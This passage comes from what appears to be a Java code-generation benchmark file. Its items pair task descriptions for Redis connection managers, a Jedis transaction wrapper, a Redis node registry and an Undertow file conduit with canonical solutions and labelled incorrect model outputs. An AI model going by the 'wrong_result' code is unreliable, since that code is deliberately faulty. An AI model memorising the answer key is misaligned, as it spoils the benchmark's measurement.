    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.HostAndPorts;\nimport redis.clients.jedis.RedisProtocol;\nimport redis.clients.jedis.EndpointConfig;\n\npublic class RedisConnectionManager {\n\n    protected static final EndpointConfig endpoint = HostAndPorts.getRedisEndpoint(\"standalone0\");\n    protected final RedisProtocol protocol;\n    protected Jedis jedis;\n\n    public RedisConnectionManager(RedisProtocol protocol) {\n        this.protocol = protocol;\n    }\n\n    public void setUpConnection() throws Exception {\n        jedis = new Jedis(endpoint.getHostAndPort(), endpoint.getClientConfigBuilder()\n            .protocol(protocol).timeoutMillis(500).build());\n        jedis.flushAll();\n    }\n\n    public void closeConnection() throws Exception {\n        jedis.close();\n    }\n\n    public Jedis createNewConnection() {\n        return new Jedis(endpoint.getHostAndPort(), endpoint.getClientConfigBuilder()\n            .protocol(protocol).build());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisConnectionManager {\n    private EndpointConfig endpoint;\n    private RedisProtocol protocol;\n    private Jedis jedis;\n\n    public void setUpConnection() {\n        if (jedis != null) {\n            jedis.close();\n        }\n        jedis = createNewConnection();\n        jedis.flushAll();\n    }\n\n    public void closeConnection() {\n        if (jedis != null) {\n            jedis.close();\n            jedis = null;\n        }\n    }\n\n    public Jedis createNewConnection() {\n        Jedis newJedis;\n        if (protocol == RedisProtocol.SSL) {\n            newJedis = new Jedis(endpoint.getHost(), endpoint.getPort(), endpoint.getTimeout(), true);\n        } else {\n            newJedis = new Jedis(endpoint.getHost(), endpoint.getPort(), endpoint.getTimeout());\n        }\n        return newJedis;\n    }\n}"
  },
  {
    "Task_id": 31,
    "Instruction": "Task Description: Create a Java class that implements StreamSinkConduit to handle file channel operations for writing data to a file, with proper management of write operations and resource cleanup.\n\nClass Description: FileConduitTarget is a class that implements StreamSinkConduit to provide file channel operations for writing data. It manages file writes, transfers, and resource cleanup while integrating with an HTTP server exchange for thread management.\n\nAttributes:\n- fileChannel: FileChannel - The file channel used for writing data to the file\n- exchange: HttpServerExchange - The HTTP server exchange for thread management\n- writeReadyHandler: WriteReadyHandler - Handler for write readiness events\n- writesResumed: boolean - Flag indicating whether writes are currently resumed\n\nMethods:\n- transferFrom(FileChannel, long, long) -> long - Transfers data from the given file channel to this file channel\n- transferFrom(StreamSourceChannel, long, ByteBuffer) -> long - Transfers data from the given stream source channel to this file channel\n- write(ByteBuffer) -> int - Writes data from the given byte buffer to the file channel\n- write(ByteBuffer[], int, int) -> long - Writes data from the given byte buffer array to the file channel\n- writeFinal(ByteBuffer) -> int - Performs a final write operation from the given byte buffer\n- writeFinal(ByteBuffer[], int, int) -> long - Performs a final write operation from the given byte buffer array\n- terminateWrites() -> void - Closes the file channel to terminate writes\n- isWriteShutdown() -> boolean - Checks if writes are shutdown (file channel closed)\n- resumeWrites() -> void - Resumes write operations\n- suspendWrites() -> void - Suspends write operations\n- wakeupWrites() -> void - Wakes up pending write operations\n- isWriteResumed() -> boolean - Checks if writes are currently resumed\n- awaitWritable() -> void - Waits for the channel to become writable (no-op implementation)\n- awaitWritable(long, TimeUnit) -> void - Waits for the channel to become writable with timeout (no-op implementation)\n- getWriteThread() -> XnioIoThread - Gets the I/O thread from the exchange\n- setWriteReadyHandler(WriteReadyHandler) -> void - Sets the write ready handler\n- truncateWrites() -> void - Closes the file channel to truncate writes\n- flush() -> boolean - Flushes any buffered data (always returns true)\n- getWorker() -> XnioWorker - Gets the worker from the exchange connection",
    "Canonical_solution": "import io.undertow.server.HttpServerExchange;\nimport io.undertow.util.ImmediateConduitFactory;\nimport org.xnio.IoUtils;\nimport org.xnio.XnioIoThread;\nimport org.xnio.XnioWorker;\nimport org.xnio.channels.StreamSourceChannel;\nimport org.xnio.conduits.ConduitStreamSinkChannel;\nimport org.xnio.conduits.Conduits;\nimport org.xnio.conduits.StreamSinkConduit;\nimport org.xnio.conduits.WriteReadyHandler;\n\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.TimeUnit;\n\npublic class FileConduitTarget implements StreamSinkConduit {\n    private final FileChannel fileChannel;\n    private final HttpServerExchange exchange;\n    private WriteReadyHandler writeReadyHandler;\n    private boolean writesResumed = false;\n\n    public FileConduitTarget(FileChannel fileChannel, HttpServerExchange exchange) {\n        this.fileChannel = fileChannel;\n        this.exchange = exchange;\n    }\n\n    @Override\n    public long transferFrom(FileChannel fileChannel, long l, long l2) throws IOException {\n        return this.fileChannel.transferFrom(fileChannel, l, l2);\n    }\n\n    @Override\n    public long transferFrom(StreamSourceChannel streamSourceChannel, long l, ByteBuffer byteBuffer) throws IOException {\n        return IoUtils.transfer(streamSourceChannel, l, byteBuffer, fileChannel);\n    }\n\n    @Override\n    public int write(ByteBuffer byteBuffer) throws IOException {\n        return fileChannel.write(byteBuffer);\n    }\n\n    @Override\n    public long write(ByteBuffer[] byteBuffers, int i, int i2) throws IOException {\n        return fileChannel.write(byteBuffers, i, i2);\n    }\n\n    @Override\n    public int writeFinal(ByteBuffer src) throws IOException {\n        return Conduits.writeFinalBasic(this, src);\n    }\n\n    @Override\n    public long writeFinal(ByteBuffer[] srcs, int offset, int length) throws IOException {\n        return Conduits.writeFinalBasic(this, srcs, offset, length);\n    }\n\n    @Override\n    public void terminateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    @Override\n    public boolean isWriteShutdown() {\n        return !fileChannel.isOpen();\n    }\n\n    @Override\n    public void resumeWrites() {\n        wakeupWrites();\n    }\n\n    @Override\n    public void suspendWrites() {\n        writesResumed = false;\n    }\n\n    @Override\n    public void wakeupWrites() {\n        if (writeReadyHandler != null) {\n            writesResumed = true;\n            while (writesResumed && writeReadyHandler != null) {\n                writeReadyHandler.writeReady();\n            }\n        }\n    }\n\n    @Override\n    public boolean isWriteResumed() {\n        return writesResumed;\n    }\n\n    @Override\n    public void awaitWritable() throws IOException {\n    }\n\n    @Override\n    public void awaitWritable(long l, TimeUnit timeUnit) throws IOException {\n    }\n\n    @Override\n    public XnioIoThread getWriteThread() {\n        return exchange.getIoThread();\n    }\n\n    @Override\n    public void setWriteReadyHandler(WriteReadyHandler writeReadyHandler) {\n        this.writeReadyHandler = writeReadyHandler;\n    }\n\n    @Override\n    public void truncateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    @Override\n    public boolean flush() throws IOException {\n        return true;\n    }\n\n    @Override\n    public XnioWorker getWorker() {\n        return exchange.getConnection().getWorker();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileConduitTarget implements StreamSinkConduit {\n    private final FileChannel fileChannel;\n    private final HttpServerExchange exchange;\n    private final WriteReadyHandler writeReadyHandler;\n    private boolean writesResumed;\n\n    public FileConduitTarget(FileChannel fileChannel, HttpServerExchange exchange, WriteReadyHandler writeReadyHandler) {\n        this.fileChannel = fileChannel;\n        this.exchange = exchange;\n        this.writeReadyHandler = writeReadyHandler;\n        this.writesResumed = true;\n    }\n\n    @Override\n    public long transferFrom(FileChannel source, long position, long count) throws IOException {\n        return source.transferFrom(this.fileChannel, position, count);\n    }\n\n    @Override\n    public long transferFrom(StreamSourceChannel source, long position, ByteBuffer buffer) throws IOException {\n        return source.transferFrom(this.fileChannel, position, buffer);\n    }\n\n    @Override\n    public int write(ByteBuffer buffer) throws IOException {\n        if (fileChannel == null || isWriteShutdown()) {\n            throw new IOException(\"Channel is closed\");\n        }\n        if (!writesResumed) {\n            resumeWrites();\n        }\n        int written = fileChannel.write(buffer);\n        if (written > 0) {\n            if (writeReadyHandler != null) {\n                writeReadyHandler.writeReady();\n            }\n        }\n        return written;\n    }\n\n    @Override\n    public long write(ByteBuffer[] buffers, int index, int length) throws IOException {\n        if (fileChannel == null || isWriteShutdown()) {\n            throw new IOException(\"Channel is closed\");\n        }\n        if (!writesResumed) {\n            resumeWrites();\n        }\n        long totalWritten = 0;\n        for (int i = 0; i < length; i++) {\n            ByteBuffer buffer = buffers[index + i];\n            long written = fileChannel.write(buffer);\n            totalWritten += written;\n            if (written > 0) {\n                if (writeReadyHandler != null) {\n                    writeReadyHandler.writeReady();\n                }\n            }\n        }\n        return totalWritten;\n    }\n\n    @Override\n    public int writeFinal(ByteBuffer buffer) throws IOException {\n        if (fileChannel == null || isWriteShutdown()) {\n            throw new IOException(\"Channel is closed\");\n        }\n        if (!writesResumed) {\n            resumeWrites();\n        }\n        int written = fileChannel.write(buffer);\n        if (written < buffer.remaining()) {\n            // Handle partial write, but final write may not require further action\n        }\n        return written;\n    }\n\n    @Override\n    public long writeFinal(ByteBuffer[] buffers, int index, int length) throws IOException {\n        if (fileChannel == null || isWriteShutdown()) {\n            throw new IOException(\"Channel is closed\");\n        }\n        if (!writesResumed) {\n            resumeWrites();\n        }\n        long totalWritten = 0;\n        for (int i = 0; i < length; i++) {\n            ByteBuffer buffer = buffers[index + i];\n            long written = fileChannel.write(buffer);\n            totalWritten += written;\n            if (written > 0) {\n                if (writeReadyHandler != null) {\n                    writeReadyHandler.writeReady();\n                }\n            }\n        }\n        return totalWritten;\n    }\n\n    @Override\n    public void terminateWrites() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n            fileChannel = null;\n        }\n    }\n\n    @Override\n    public boolean isWriteShutdown() {\n        return fileChannel == null || !fileChannel.isOpen();\n    }\n\n    @Override\n    public void resumeWrites() {\n        writesResumed = true;\n    }\n\n    @Override\n    public void suspendWrites() {\n        writesResumed = false;\n    }\n\n    @Override\n    public void wakeupWrites() {\n        // No-op\n    }\n\n    @Override\n    public boolean isWriteResumed() {\n        return writesResumed;\n    }\n\n    @Override\n    public void awaitWritable() {\n        // No-op\n    }\n\n    @Override\n    public void awaitWritable(long timeout, TimeUnit unit) {\n        // No-op\n    }\n\n    @Override\n    public XnioIoThread getWriteThread() {\n        return exchange.getIoThread();\n    }\n\n    @Override\n    public void setWriteReadyHandler(WriteReadyHandler handler) {\n        this.writeReadyHandler = handler;\n    }\n\n    @Override\n    public void truncateWrites() throws IOException {\n        terminateWrites();\n    }\n\n    @Override\n    public boolean flush() {\n        return true;\n    }\n\n    @Override\n    public XnioWorker getWorker() {\n        return exchange.getConnection().getWorker();\n    }\n}"
  },
  {
    "Task_id": 310,
    "Instruction": "Task Description: Implement a reliable Redis transaction handler class that manages MULTI/EXEC transactions, WATCH/UNWATCH operations, and connection handling in a Java application using Jedis client library.\n\nClass Description: The ReliableTransaction class provides a robust wrapper around Redis transactions, offering atomic operations, watch mechanisms for optimistic locking, and proper resource management. It handles the complete transaction lifecycle including initiation, command queuing, execution, and cleanup.\n\nAttributes:\n- pipelinedResponses: Queue<Response<?>> - Stores responses for queued commands in a transaction\n- connection: Connection - The Redis connection instance\n- closeConnection: boolean - Flag indicating whether to close the connection when done\n- broken: boolean - Indicates if the connection is in a broken state\n- inWatch: boolean - Tracks WATCH status\n- inMulti: boolean - Tracks MULTI status\n- commandObjects: CommandObjects - Provides command building functionality\n\nMethods:\n- ReliableTransaction(Connection, boolean, boolean, CommandObjects) -> void - Constructor that initializes the transaction handler\n- multi() -> void - Starts a Redis MULTI transaction\n- watch(String...) -> String - Watches given keys for changes (optimistic locking)\n- unwatch() -> String - Removes all watched keys\n- appendCommand(CommandObject<T>) -> Response<T> - Adds a command to the transaction queue\n- close() -> void - Cleans up and optionally closes the connection\n- clear() -> void - Clears current transaction or watch state\n- exec() -> List<Object> - Executes all queued commands atomically\n- discard() -> String - Discards all commands in the current transaction",
    "Canonical_solution": "import redis.clients.jedis.Connection;\nimport redis.clients.jedis.JedisConnectionException;\nimport redis.clients.jedis.JedisDataException;\nimport redis.clients.jedis.JedisException;\nimport redis.clients.jedis.Protocol.Command;\nimport redis.clients.jedis.Response;\nimport redis.clients.jedis.commands.CommandObjects;\nimport redis.clients.jedis.graph.GraphCommandObjects;\nimport redis.clients.jedis.util.RedisProtocol;\n\nimport java.util.ArrayList;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Queue;\n\npublic class ReliableTransaction {\n\n    private static final String QUEUED_STR = \"QUEUED\";\n    private final Queue<Response<?>> pipelinedResponses = new LinkedList<>();\n    protected final Connection connection;\n    private final boolean closeConnection;\n    private boolean broken = false;\n    private boolean inWatch = false;\n    private boolean inMulti = false;\n    private final CommandObjects commandObjects;\n\n    public ReliableTransaction(Connection connection, boolean doMulti, boolean closeConnection, CommandObjects commandObjects) {\n        this.connection = connection;\n        this.closeConnection = closeConnection;\n        this.commandObjects = commandObjects;\n        GraphCommandObjects graphCommandObjects = new GraphCommandObjects(this.connection);\n        graphCommandObjects.setBaseCommandArgumentsCreator(protocolCommand -> commandObjects.commandArguments(protocolCommand));\n        if (doMulti) multi();\n    }\n\n    public void multi() {\n        connection.sendCommand(Command.MULTI);\n        String status = connection.getStatusCodeReply();\n        if (!\"OK\".equals(status)) {\n            throw new JedisException(\"MULTI command failed. Received response: \" + status);\n        }\n        inMulti = true;\n    }\n\n    public String watch(final String... keys) {\n        String status = connection.executeCommand(commandObjects.watch(keys));\n        inWatch = true;\n        return status;\n    }\n\n    public String unwatch() {\n        connection.sendCommand(Command.UNWATCH);\n        String status = connection.getStatusCodeReply();\n        inWatch = false;\n        return status;\n    }\n\n    protected <T> Response<T> appendCommand(CommandObject<T> commandObject) {\n        connection.sendCommand(commandObject.getArguments());\n        String status = connection.getStatusCodeReply();\n        if (!QUEUED_STR.equals(status)) {\n            throw new JedisException(status);\n        }\n        Response<T> response = new Response<>(commandObject.getBuilder());\n        pipelinedResponses.add(response);\n        return response;\n    }\n\n    public void close() {\n        try {\n            clear();\n        } finally {\n            if (closeConnection) {\n                connection.close();\n            }\n        }\n    }\n\n    public void clear() {\n        if (broken) return;\n        if (inMulti) {\n            discard();\n        } else if (inWatch) {\n            unwatch();\n        }\n    }\n\n    public List<Object> exec() {\n        if (!inMulti) throw new IllegalStateException(\"EXEC without MULTI\");\n\n        try {\n            connection.sendCommand(Command.EXEC);\n            List<Object> unformatted = connection.getObjectMultiBulkReply();\n            if (unformatted == null) {\n                pipelinedResponses.clear();\n                return null;\n            }\n\n            List<Object> formatted = new ArrayList<>(unformatted.size());\n            for (Object o : unformatted) {\n                try {\n                    Response<?> response = pipelinedResponses.poll();\n                    response.set(o);\n                    formatted.add(response.get());\n                } catch (JedisDataException e) {\n                    formatted.add(e);\n                }\n            }\n            return formatted;\n        } catch (JedisConnectionException jce) {\n            broken = true;\n            throw jce;\n        } finally {\n            inMulti = false;\n            inWatch = false;\n            pipelinedResponses.clear();\n        }\n    }\n\n    public String discard() {\n        if (!inMulti) throw new IllegalStateException(\"DISCARD without MULTI\");\n\n        try {\n            connection.sendCommand(Command.DISCARD);\n            String status = connection.getStatusCodeReply();\n            if (!\"OK\".equals(status)) {\n                throw new JedisException(\"DISCARD command failed. Received response: \" + status);\n            }\n            return status;\n        } catch (JedisConnectionException jce) {\n            broken = true;\n            throw jce;\n        } finally {\n            inMulti = false;\n            inWatch = false;\n            pipelinedResponses.clear();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class ReliableTransaction {\n    private Queue<Response<?>> pipelinedResponses;\n    private Connection connection;\n    private boolean closeConnection;\n    private boolean broken;\n    private boolean inWatch;\n    private boolean inMulti;\n    private CommandObjects commandObjects;\n\n    public ReliableTransaction(Connection connection, boolean closeConnection, boolean inMulti, CommandObjects commandObjects) {\n        this.connection = connection;\n        this.closeConnection = closeConnection;\n        this.inMulti = inMulti;\n        this.commandObjects = commandObjects;\n        this.broken = false;\n        this.inWatch = false;\n        this.pipelinedResponses = new LinkedList<>();\n    }\n\n    public void multi() {\n        if (!inMulti) {\n            connection.multi();\n            inMulti = true;\n        }\n    }\n\n    public String watch(String... keys) {\n        if (!inWatch) {\n            connection.watch(keys);\n            inWatch = true;\n        }\n        return \"OK\";\n    }\n\n    public String unwatch() {\n        if (inWatch) {\n            connection.unwatch();\n            inWatch = false;\n        }\n        return \"OK\";\n    }\n\n    public Response<?> appendCommand(CommandObject<?> command) {\n        if (inMulti) {\n            command.execute(connection);\n            pipelinedResponses.add(command.getResponse());\n            return command.getResponse();\n        } else {\n            throw new IllegalStateException(\"Not in a transaction\");\n        }\n    }\n\n    public void close() {\n        if (closeConnection && connection != null) {\n            connection.close();\n        }\n    }\n\n    public void clear() {\n        if (inMulti) {\n            discard();\n        }\n        if (inWatch) {\n            unwatch();\n        }\n    }\n\n    public List<Object> exec() {\n        if (!inMulti) {\n            throw new IllegalStateException(\"Not in a transaction\");\n        }\n        List<Object> responses = new ArrayList<>();\n        try {\n            List<Response<?>> results = connection.exec();\n            for (Response<?> response : results) {\n                responses.add(response.get());\n            }\n            pipelinedResponses.addAll(results);\n        } catch (Exception e) {\n            broken = true;\n        } finally {\n            inMulti = false;\n        }\n        return responses;\n    }\n\n    public String discard() {\n        if (inMulti) {\n            connection.discard();\n            pipelinedResponses.clear();\n            inMulti = false;\n        }\n        return \"OK\";\n    }\n}"
  },
  {
    "Task_id": 311,
    "Instruction": "Task Description: Create a Java class that manages Redis connections using the Jedis client library, providing functionality for connection establishment, credential updates, and resource cleanup.\n\nClass Description: The RedisConnectionManager class encapsulates Redis connection management using JedisPooled for connection pooling. It handles authentication, provides access to the Jedis instance, allows credential updates, and ensures proper resource cleanup.\n\nAttributes:\n- jedis: JedisPooled - The pooled Redis connection instance\n- credentialsProvider: DefaultRedisCredentialsProvider - Provider for Redis authentication credentials\n\nMethods:\n- RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) -> void - Constructor that initializes the Redis connection with host, port, and initial credentials\n- updateCredentials(String updatedUsername, String updatedPassword) -> void - Updates the authentication credentials for the Redis connection\n- getJedisInstance() -> JedisPooled - Returns the managed JedisPooled instance for Redis operations\n- closeConnection() -> void - Closes the Redis connection and releases resources",
    "Canonical_solution": "import redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.DefaultRedisCredentials;\nimport redis.clients.jedis.DefaultRedisCredentialsProvider;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisPooled;\n\npublic class RedisConnectionManager {\n\n    private JedisPooled jedis;\n    private DefaultRedisCredentialsProvider credentialsProvider;\n\n    public RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) {\n        DefaultRedisCredentials initialCredentials = new DefaultRedisCredentials(initialUsername, initialPassword);\n        this.credentialsProvider = new DefaultRedisCredentialsProvider(initialCredentials);\n        HostAndPort address = new HostAndPort(host, port);\n        DefaultJedisClientConfig clientConfig = DefaultJedisClientConfig.builder()\n                .credentialsProvider(credentialsProvider).build();\n        this.jedis = new JedisPooled(address, clientConfig);\n    }\n\n    public void updateCredentials(String updatedUsername, String updatedPassword) {\n        DefaultRedisCredentials updatedCredentials = new DefaultRedisCredentials(updatedUsername, updatedPassword);\n        credentialsProvider.setCredentials(updatedCredentials);\n    }\n\n    public JedisPooled getJedisInstance() {\n        return jedis;\n    }\n\n    public void closeConnection() {\n        jedis.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisConnectionManager {\n    private String host;\n    private int port;\n    private JedisPooled jedis;\n    private DefaultRedisCredentialsProvider credentialsProvider;\n\n    public RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) {\n        this.host = host;\n        this.port = port;\n        this.credentialsProvider = new DefaultRedisCredentialsProvider(initialUsername, initialPassword);\n        this.jedis = new JedisPooled(host, port);\n        this.jedis.auth(initialPassword);\n    }\n\n    public void updateCredentials(String updatedUsername, String updatedPassword) {\n        this.credentialsProvider = new DefaultRedisCredentialsProvider(updatedUsername, updatedPassword);\n        if (this.jedis != null) {\n            this.jedis.close();\n        }\n        this.jedis = new JedisPooled(host, port);\n        this.jedis.auth(updatedPassword);\n    }\n\n    public JedisPooled getJedisInstance() {\n        return this.jedis;\n    }\n\n    public void closeConnection() {\n        if (this.jedis != null) {\n            this.jedis.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 312,
    "Instruction": "Task Description: Implement a Redis-based registry class for node registration and subscription in a distributed system, using Java with Jedis client library.\n\nClass Description: RedisRegistry is a class that provides node registration and subscription capabilities using Redis as the backend storage. It maintains connections to Redis servers, handles node registration, and manages subscription to node changes.\n\nAttributes:\n- jedisPools: ConcurrentHashMap<String, JedisPool> - A thread-safe map storing JedisPool instances for different Redis server addresses\n- clusterName: String - The name of the current cluster\n- replicate: boolean - Flag indicating whether operations should be replicated to all Redis servers\n- notifiers: ConcurrentMap<String, Notifier> - A thread-safe map storing Notifier instances for different node paths\n\nMethods:\n- RedisRegistry(AppContext appContext) - Constructor - Initializes the registry with configuration from AppContext\n  Input: appContext: AppContext - The application context containing configuration\n  Output: None\n\n- doRegister(Node node) - protected - Registers a node in Redis\n  Input: node: Node - The node to be registered\n  Output: None (throws NodeRegistryException on failure)\n\n- doSubscribe(Node node, NotifyListener listener) - protected - Subscribes to node changes\n  Input: \n    node: Node - The node that wants to subscribe\n    listener: NotifyListener - The listener to be notified of changes\n  Output: None\n\nNested Classes:\n- NotifySub extends JedisPubSub - Handles Redis pub/sub messages\n  Methods:\n    onMessage(String key, String msg) - Processes incoming messages\n      Input:\n        key: String - The channel/key of the message\n        msg: String - The message content\n      Output: None\n\n- Notifier extends Thread - Manages subscription thread\n  Methods:\n    run() - Main thread execution for subscription\n      Input: None\n      Output: None\n    shutdown() - Stops the subscription thread\n      Input: None\n      Output: None",
    "Canonical_solution": "import com.github.ltsopensource.core.AppContext;\nimport com.github.ltsopensource.core.cluster.Config;\nimport com.github.ltsopensource.core.cluster.Node;\nimport com.github.ltsopensource.core.cluster.NodeType;\nimport com.github.ltsopensource.core.commons.utils.CollectionUtils;\nimport com.github.ltsopensource.core.constant.Constants;\nimport com.github.ltsopensource.core.exception.NodeRegistryException;\nimport com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport com.github.ltsopensource.core.registry.NotifyEvent;\nimport com.github.ltsopensource.core.registry.NotifyListener;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPubSub;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class RedisRegistry {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RedisRegistry.class);\n    private final Map<String, JedisPool> jedisPools = new ConcurrentHashMap<String, JedisPool>();\n    private String clusterName;\n    private boolean replicate;\n    private final ConcurrentMap<String, Notifier> notifiers = new ConcurrentHashMap<String, Notifier>();\n\n    public RedisRegistry(AppContext appContext) {\n        Config config = appContext.getConfig();\n        this.clusterName = config.getClusterName();\n\n        String address = NodeRegistryUtils.getRealRegistryAddress(config.getRegistryAddress());\n        String[] addrs = address.split(\",\");\n        for (String addr : addrs) {\n            int i = addr.indexOf(':');\n            String host = addr.substring(0, i);\n            int port = Integer.parseInt(addr.substring(i + 1));\n            this.jedisPools.put(addr, new JedisPool(new JedisPoolConfig(), host, port, Constants.DEFAULT_TIMEOUT));\n        }\n    }\n\n    protected void doRegister(Node node) {\n        String key = NodeRegistryUtils.getNodeTypePath(clusterName, node.getNodeType());\n        boolean success = false;\n        NodeRegistryException exception = null;\n        for (Map.Entry<String, JedisPool> entry : jedisPools.entrySet()) {\n            JedisPool jedisPool = entry.getValue();\n            try {\n                Jedis jedis = jedisPool.getResource();\n                try {\n                    jedis.hset(key, node.toFullString(), String.valueOf(SystemClock.now() + Constants.DEFAULT_SESSION_TIMEOUT));\n                    jedis.publish(key, Constants.REGISTER);\n                    success = true;\n                    if (!replicate) {\n                        break;\n                    }\n                } finally {\n                    jedis.close();\n                }\n            } catch (Throwable t) {\n                exception = new NodeRegistryException(\"Failed to register node to redis registry. registry: \" + entry.getKey() + \", node: \" + node + \", cause: \" + t.getMessage(), t);\n            }\n        }\n        if (exception != null && !success) {\n            throw exception;\n        }\n    }\n\n    protected void doSubscribe(Node node, NotifyListener listener) {\n        List<NodeType> listenNodeTypes = node.getListenNodeTypes();\n        if (CollectionUtils.isEmpty(listenNodeTypes)) {\n            return;\n        }\n        for (NodeType listenNodeType : listenNodeTypes) {\n            String listenNodePath = NodeRegistryUtils.getNodeTypePath(clusterName, listenNodeType);\n            Notifier notifier = notifiers.get(listenNodePath);\n            if (notifier == null) {\n                Notifier newNotifier = new Notifier(listenNodePath);\n                notifiers.putIfAbsent(listenNodePath, newNotifier);\n                notifier = notifiers.get(listenNodePath);\n                if (notifier == newNotifier) {\n                    notifier.start();\n                }\n            }\n        }\n    }\n\n    private class NotifySub extends JedisPubSub {\n        private final JedisPool jedisPool;\n\n        public NotifySub(JedisPool jedisPool) {\n            this.jedisPool = jedisPool;\n        }\n\n        @Override\n        public void onMessage(String key, String msg) {\n            if (msg.equals(Constants.REGISTER) || msg.equals(Constants.UNREGISTER)) {\n                try {\n                    Jedis jedis = jedisPool.getResource();\n                    try {\n                        doNotify(jedis, key);\n                    } finally {\n                        jedis.close();\n                    }\n                } catch (Throwable t) {\n                    LOGGER.error(t.getMessage(), t);\n                }\n            }\n        }\n    }\n\n    private class Notifier extends Thread {\n        private final String listenNodePath;\n        private volatile Jedis jedis;\n        private volatile boolean running = true;\n\n        public Notifier(String listenNodePath) {\n            super.setDaemon(true);\n            super.setName(\"LTSRedisSubscribe\");\n            this.listenNodePath = listenNodePath;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (running) {\n                    for (Map.Entry<String, JedisPool> entry : jedisPools.entrySet()) {\n                        try {\n                            JedisPool jedisPool = entry.getValue();\n                            jedis = jedisPool.getResource();\n                            try {\n                                jedis.subscribe(new NotifySub(jedisPool), listenNodePath);\n                                break;\n                            } finally {\n                                jedis.close();\n                            }\n                        } catch (Throwable t) {\n                            LOGGER.warn(\"Failed to subscribe node from redis registry. registry: \" + entry.getKey(), t);\n                        }\n                    }\n                }\n            } catch (Throwable t) {\n                LOGGER.error(t.getMessage(), t);\n            }\n        }\n\n        public void shutdown() {\n            try {\n                running = false;\n                jedis.disconnect();\n            } catch (Throwable t) {\n                LOGGER.warn(t.getMessage(), t);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisRegistry {\n    private final ConcurrentHashMap<String, JedisPool> jedisPools;\n    private final String clusterName;\n    private final boolean replicate;\n    private final ConcurrentMap<String, Notifier> notifiers;\n\n    public RedisRegistry(AppContext appContext) {\n        this.clusterName = appContext.getClusterName();\n        this.replicate = appContext.isReplicate();\n        this.jedisPools = new ConcurrentHashMap<>();\n        this.notifiers = new ConcurrentHashMap<>();\n        \n        for (String redisServer : appContext.getRedisServers()) {\n            JedisPool pool = new JedisPool(new JedisPoolConfig(), redisServer);\n            jedisPools.put(redisServer, pool);\n        }\n    }\n\n    protected void doRegister(Node node) throws NodeRegistryException {\n        if (replicate) {\n            for (Map.Entry<String, JedisPool> entry : jedisPools.entrySet()) {\n                try (Jedis jedis = entry.getValue().getResource()) {\n                    String key = String.format(\"%s:%s\", clusterName, node.getPath());\n                    String value = node.toJson();\n                    jedis.set(key, value);\n                } catch (Exception e) {\n                    throw new NodeRegistryException(\"Failed to register node: \" + node.getPath(), e);\n                }\n            }\n        } else {\n            String redisServer = appContext.getPrimaryRedisServer();\n            try (Jedis jedis = jedisPools.get(redisServer).getResource()) {\n                String key = String.format(\"%s:%s\", clusterName, node.getPath());\n                String value = node.toJson();\n                jedis.set(key, value);\n            } catch (Exception e) {\n                throw new NodeRegistryException(\"Failed to register node: \" + node.getPath(), e);\n            }\n        }\n    }\n\n    protected void doSubscribe(Node node, NotifyListener listener) {\n        String path = node.getPath();\n        Notifier notifier = notifiers.get(path);\n        if (notifier == null) {\n            notifier = new Notifier(node, listener);\n            notifiers.put(path, notifier);\n            notifier.start();\n        }\n    }\n\n    private static class NotifySub extends JedisPubSub {\n        private final NotifyListener listener;\n\n        public NotifySub(NotifyListener listener) {\n            this.listener = listener;\n        }\n\n        @Override\n        public void onMessage(String channel, String message) {\n            if (channel.startsWith(clusterName + \":\")) {\n                listener.onNotify(channel, message);\n            }\n        }\n    }\n\n    private class Notifier extends Thread {\n        private final Node node;\n        private final NotifyListener listener;\n        private volatile boolean running = true;\n\n        public Notifier(Node node, NotifyListener listener) {\n            this.node = node;\n            this.listener = listener;\n        }\n\n        @Override\n        public void run() {\n            String redisServer = appContext.getPrimaryRedisServer();\n            try (Jedis jedis = jedisPools.get(redisServer).getResource()) {\n                String channel = String.format(\"%s:%s\", clusterName, node.getPath());\n                NotifySub subscriber = new NotifySub(listener);\n                jedis.psubscribe(subscriber, channel);\n            } catch (Exception e) {\n                listener.onError(\"Subscription failed for node: \" + node.getPath(), e);\n            }\n        }\n\n        public void shutdown() {\n            running = false;\n            // Additional cleanup if needed\n        }\n    }\n}"
  },
  {
    "Task_id": 313,
    "Instruction": "Task Description: Create a Redis connection manager class in Java using Lettuce client that handles connection setup, management, and cleanup.\n\nClass Description: RedisConnectionManager is a utility class that manages Redis connections using Lettuce client. It provides methods to establish a connection with configurable timeout options, retrieve the active connection, and properly close the connection when no longer needed.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used to create connections\n- connection: StatefulRedisConnection<byte[], byte[]> - The active Redis connection using byte array codec\n\nMethods:\n- setupConnection(String host, int port) -> void - Initializes the Redis client and establishes a connection to the specified Redis server with a 10-second timeout configuration\n- closeConnection() -> void - Properly closes the active connection and shuts down the Redis client\n- getConnection() -> StatefulRedisConnection<byte[], byte[]> - Returns the active Redis connection instance",
